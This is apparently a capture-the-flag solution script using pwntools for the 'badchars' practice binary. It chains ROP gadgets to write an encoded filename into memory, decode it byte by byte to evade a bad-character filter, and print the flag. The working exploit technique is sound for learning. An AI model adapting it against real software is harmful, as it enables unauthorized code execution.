from pwn import *  # Set up pwntools to work with this binary
from struct import *

p = process(['./badchars'])
elf = ELF('./badchars')
g = ROP(elf)
name = b'flag.txt'

write_to_mem = p64(0x0000000000400634)  # mov qword ptr [r13], r12 ; ret
pop_rs = p64(0x000000000040069c)  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mem_loc = p64(0x0000000000601038)  # place to write to, .bss
pop_rdi = p64(0x00000000004006a3)
pop_rsi = p64(0x00000000004006a1)  # pop rsi ; pop r15 ; ret
sub = p64(0x0000000000400630)  # sub byte ptr [r15], r14b ; ret
pop_r14_r15 = p64(0x00000000004006a0)  # : pop r14 ; pop r15 ; ret

buf = b'b' * 40   # 40

buf += pop_rs
buf += p64(0x7479742F68626C66)  # flbh/tyt
buf += mem_loc  # place to write to, .bss
buf += p64(0x9) *2 
buf += write_to_mem

indx = [2,3,4,6]
for i in indx:
    buf += pop_r14_r15
    buf += b"\x01"*8
    buf += p64(0x601038 + i)
    buf += sub
# flag.txt now
buf += pop_rdi  # pop rdi
buf += mem_loc
buf += pop_rsi
buf += p64(0x00000000040080a)
buf += p64(0x00000000000004f1) # 'r'
buf += p64(0x000000000400620)

print(buf)
with open('t', 'wb') as f:
    f.write(buf)

p.sendline(buf)

# Printing the flag
p.interactive()
